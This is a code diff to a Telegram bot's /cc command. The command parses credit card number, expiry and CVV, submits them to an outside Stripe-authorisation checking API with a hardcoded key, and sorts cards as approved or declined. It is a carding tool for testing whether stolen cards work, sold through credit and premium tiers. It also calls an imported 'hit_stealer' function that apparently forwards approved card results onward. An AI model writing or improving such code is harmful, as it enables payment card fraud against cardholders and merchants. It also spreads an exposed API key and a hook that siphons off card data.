@@ -1,9 +1,10 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.enums import ChatType
 import re, time, httpx
 from plugins.func.users_sql import *
 from datetime import date
-from plugins.tools.hit_stealer import send_hit_if_approved  # Stealer import
+from plugins.tools.hit_stealer import send_hit_if_approved
 
 API_URL = "https://barryxapi.xyz/stripe_auth"
 API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
@@ -38,47 +39,54 @@ async def cmd_cc(Client, message):
     try:
         user_id = str(message.from_user.id)
         chat_id = message.chat.id
-        chat_type = str(message.chat.type).lower()
+        chat_type = message.chat.type
         username = message.from_user.username or "None"
 
         regdata = fetchinfo(user_id)
         if not regdata:
-            insert_reg_data(user_id, username, 0, str(date.today()))
-            regdata = fetchinfo(user_id)
+            return await message.reply_text("❌ You are not registered. Use /register first.")
 
-        role = regdata[2] or "FREE"
+        role = (regdata[2] or "FREE").strip().upper()
         credit = int(regdata[5] or 0)
         wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
         antispam_time = int(regdata[7] or 0)
         now = int(time.time())
 
-        GROUP = open("plugins/group.txt").read().splitlines()
-        if chat_type == "private" and role == "FREE":
+        # BLOCK FREE USERS IN BOT PM
+        if chat_type == "ChatType.PRIVATE" and role == "FREE":
             return await message.reply_text(
-                "Premium Users Required ⚠️\nJoin group for free use:",
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]]
-                ),
+                "⚠️ <b>Premium Users Required</b>\n"
+                "Only PREMIUM users can use this command in bot PM.\n"
+                "Join our group to use it for FREE:",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
+                ]),
                 disable_web_page_preview=True
             )
 
-        if chat_type in ["group", "supergroup"] and str(chat_id) not in GROUP:
-            return await message.reply_text("Unauthorized chat. Contact admin.", message.id)
+        GROUP = open("plugins/group.txt").read().splitlines()
+        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
+            return await message.reply_text("❌ Unauthorized group. Contact admin.")
 
         if credit < 1:
-            return await message.reply_text("❌ Insufficient credit.", message.id)
+            return await message.reply_text("❌ Insufficient credit.")
 
         if now - antispam_time < wait_time:
-            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)} seconds (AntiSpam)", message.id)
+            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
 
-        args = message.text.split(None, 1)
-        if len(args) < 2 and not message.reply_to_message:
-            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>", message.id)
+        cc_text = None
+        if message.reply_to_message and message.reply_to_message.text:
+            cc_text = message.reply_to_message.text.strip()
+        elif len(message.text.split(maxsplit=1)) > 1:
+            cc_text = message.text.split(maxsplit=1)[1].strip()
 
-        cc = message.reply_to_message.text if message.reply_to_message else args[1].strip()
-        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
+        if not cc_text:
+            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>")
+
+        cc_clean = re.sub(r"[^\d]", "|", cc_text)
+        match = re.search(r"(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})", cc_clean)
         if not match:
-            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv", message.id)
+            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")
 
         ccnum, mes, ano, cvv = match.groups()
         fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"
@@ -90,10 +98,9 @@ async def cmd_cc(Client, message):
 <b>⊙ CC:</b> <code>{fullcc}</code>
 <b>⊙ Status:</b> Checking...
 <b>⊙ Response:</b> Waiting...
-""", reply_to_message_id=message.id)
+""")
 
         tic = time.perf_counter()
-
         try:
             async with httpx.AsyncClient(timeout=25) as client:
                 res = await client.get(f"{API_URL}?key={API_KEY}&card={fullcc}")
@@ -117,8 +124,6 @@ async def cmd_cc(Client, message):
             status = "Approved ✅"
         elif any(k in msg_lower for k in ["declined", "pickup", "fraud", "stolen", "lost", "do not honor"]):
             status = "Declined ❌"
-        elif any(k in msg_lower for k in ["counter proposal", "price of this line"]):
-            status = "Unknown ❓"
         else:
             status = "Error ⚠️"
 
@@ -137,7 +142,9 @@ async def cmd_cc(Client, message):
 """
 
         await Client.edit_message_text(chat_id, check_msg.id, final_msg)
-        await send_hit_if_approved(Client, final_msg)
+
+        if "approved" in status.lower() or "live" in card_message.lower():
+            await send_hit_if_approved(Client, final_msg)
 
         updatedata(user_id, "credits", credit - 1)
         updatedata(user_id, "antispam_time", now)
